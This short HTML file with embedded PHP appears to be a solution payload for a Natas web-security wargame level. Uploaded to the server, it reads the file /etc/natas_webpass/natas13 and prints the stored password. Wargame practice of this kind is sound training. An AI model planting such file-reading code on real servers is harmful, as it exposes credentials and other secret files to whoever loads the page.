<!DOCTYPE html>
<html>
<body>
 
<?php
$password = fopen("/etc/natas_webpass/natas13", "r") or die("error");
echo fread($password, filesize("/etc/natas_webpass/natas13"));
?>

</body>
</html>